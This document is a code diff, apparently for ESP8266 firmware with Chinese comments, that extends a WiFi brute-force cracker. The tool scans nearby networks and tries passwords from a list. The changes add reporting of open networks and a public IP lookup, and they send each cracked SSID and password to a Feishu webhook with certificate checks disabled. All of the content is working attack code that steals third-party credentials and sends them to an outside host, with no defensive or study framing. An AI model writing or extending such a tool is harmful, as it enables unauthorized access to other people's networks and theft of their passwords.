@@ -55,7 +55,9 @@ const int password_count = sizeof(passwords) / sizeof(passwords[0]);
 const int LED_PIN = 2; // 板载 LED（低电平点亮）
 
 // === 函数声明 ===
-void sendToFeishu(const String& ssid, const String& password);
+void sendToFeishu(const String& ssid, const String& password, bool isOpenNetwork);
+void sendToFeishuOpenNetwork(const String& ssid);
+String getIPAddress();
 void blinkLED(int times, int delay_ms);
 
 void setup() {
@@ -74,15 +76,19 @@ void setup() {
   Serial.printf("发现 %d 个网络\n", n);
 
   int successCount = 0;
+  int openNetworkCount = 0;
 
   // 遍历所有扫描到的网络
   for (int i = 0; i < n; i++) {
     String ssid = WiFi.SSID(i);
     uint8_t encType = WiFi.encryptionType(i);
 
-    // 跳过开放网络
+    // 处理开放网络（无密码WiFi）
     if (encType == ENC_TYPE_NONE) {
-      Serial.printf("跳过开放网络: %s\n", ssid.c_str());
+      Serial.printf("发现开放网络: %s\n", ssid.c_str());
+      sendToFeishuOpenNetwork(ssid);
+      openNetworkCount++;
+      blinkLED(2, 200); // 闪烁表示发现开放网络
       continue;
     }
 
@@ -105,7 +111,7 @@ void setup() {
       if (WiFi.status() == WL_CONNECTED) {
         Serial.println("✅ 破解成功！");
         blinkLED(4, 150); // 快速闪烁表示成功
-        sendToFeishu(ssid, passwords[j]);
+        sendToFeishu(ssid, passwords[j], false);
         WiFi.disconnect();
         successCount++;
         cracked = true;
@@ -122,9 +128,11 @@ void setup() {
   }
 
   // 最终结果汇总
-  Serial.printf("\n=== 爆破完成 ===\n共尝试 %d 个加密网络，成功 %d 个。\n", n, successCount);
+  Serial.printf("\n=== 扫描完成 ===\n共发现 %d 个网络\n", n);
+  Serial.printf("开放网络: %d 个\n", openNetworkCount);
+  Serial.printf("破解成功: %d 个\n", successCount);
   
-  if (successCount > 0) {
+  if (successCount > 0 || openNetworkCount > 0) {
     // 长亮 2 秒表示有成果
     digitalWrite(LED_PIN, LOW);
     delay(2000);
@@ -140,23 +148,72 @@ void setup() {
 
 void loop() {}
 
-void sendToFeishu(const String& ssid, const String& password) {
+String getIPAddress() {
+  WiFiClient client;
+  HTTPClient http;
+  
+  String ipv4 = "未知";
+  String ipv6 = "未知";
+  
+  // 获取 IPv4 地址
+  if (http.begin(client, "http://4.ipw.cn")) {
+    int code = http.GET();
+    if (code == 200) {
+      ipv4 = http.getString();
+      ipv4.trim();
+    }
+    http.end();
+  }
+  
+  delay(500);
+  
+  // 获取 IPv6 地址
+  if (http.begin(client, "http://6.ipw.cn")) {
+    int code = http.GET();
+    if (code == 200) {
+      ipv6 = http.getString();
+      ipv6.trim();
+    }
+    http.end();
+  }
+  
+  return "IPv4: " + ipv4 + "\nIPv6: " + ipv6;
+}
+
+void sendToFeishu(const String& ssid, const String& password, bool isOpenNetwork) {
   WiFiClientSecure client;
   client.setInsecure(); // 测试用，忽略证书
 
   HTTPClient https;
   if (https.begin(client, webhook_url)) {
     https.addHeader("Content-Type", "application/json; charset=utf-8");
-    String json = "{\"msg_type\":\"text\",\"content\":{\"text\":\"[WiFi爆破成功]\\nSSID: ";
-    json += ssid;
-    json += "\\nPassword: ";
-    json += password;
+    
+    String ipInfo = getIPAddress();
+    
+    String json;
+    if (isOpenNetwork) {
+      json = "{\"msg_type\":\"text\",\"content\":{\"text\":\"[发现开放WiFi]\\nSSID: ";
+      json += ssid;
+      json += "\\n类型: 无密码开放网络\\n";
+    } else {
+      json = "{\"msg_type\":\"text\",\"content\":{\"text\":\"[WiFi破解成功]\\nSSID: ";
+      json += ssid;
+      json += "\\nPassword: ";
+      json += password;
+      json += "\\n";
+    }
+    
+    json += ipInfo;
     json += "\"}}";
 
     int code = https.POST(json);
     Serial.printf("飞书通知返回码: %d\n", code);
     https.end();
   }
+}
+
+void sendToFeishuOpenNetwork(const String& ssid) {
+  sendToFeishu(ssid, "", true);
 }
 
 void blinkLED(int times, int delay_ms) {
